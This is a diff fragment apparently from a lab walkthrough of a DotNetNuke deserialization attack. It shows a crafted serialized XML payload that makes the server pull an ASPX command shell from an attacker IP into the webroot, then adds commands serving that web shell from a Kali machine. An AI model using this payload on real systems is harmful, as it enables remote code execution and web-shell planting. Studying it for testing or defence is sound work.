@@ -275,3 +275,14 @@ The serialized object now looks like this:
 ```xml
 <profile><item key="myTableEntry" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils, DotNetNuke, Version=9.1.0.367, Culture=neutral, PublicKeyToken=null],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><ProjectedProperty0><ObjectInstance xsi:type="FileSystemUtils" /><MethodName>PullFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">http://192.168.45.192/cmdasp.aspx</anyType><anyType xsi:type="xsd:string">C:/inetpub/wwwroot/dotnetnuke/cmdasp.aspx</anyType></MethodParameters></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>
 ```
+### RCE
+At this stage, we can set up the full attack and attempt to gain a reverse shell by exploiting the vulnerability. To do this, we'll use an ASPX command shell available on our Kali attack machine. We'll copy the shell to the web server’s root directory.
+```bash
+┌──(kali㉿kali)-[~]
+└─$ cd /usr/share/webshells/aspx/
+                                                                                                             
+┌──(kali㉿kali)-[/usr/share/webshells/aspx]
+└─$ python3 -m http.server 80          
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+```
